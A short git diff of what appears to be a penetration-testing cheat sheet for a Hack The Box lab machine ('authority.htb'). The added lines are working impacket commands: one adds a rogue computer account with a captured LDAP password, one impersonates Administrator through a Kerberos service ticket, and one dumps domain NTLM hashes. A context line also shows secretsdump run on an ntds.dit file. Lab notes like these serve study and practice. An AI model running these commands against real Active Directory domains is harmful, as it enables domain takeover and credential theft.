@@ -974,6 +974,15 @@ c:\users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-133735
 # command to dump use 3 file 
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 
+# add new computer HACKER-PC
+impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name HACKER-PC -computer-pass 0xdf0xdf0xdf -dc-ip 10.10.11.222
+
+# impersonate Administrator to get file Administrator.ccache ( EVIL01$ can  impersonate users on AUTHORITY$ )
+impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/EVIL01$:Str0ng3st_P@ssw0rd!'
+
+# import file Administrator.ccache  to dump ntlm 
+KRB5CCNAME=Administrator.ccache impacket-secretsdump  -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
+
 ```
 ## smbclient
 
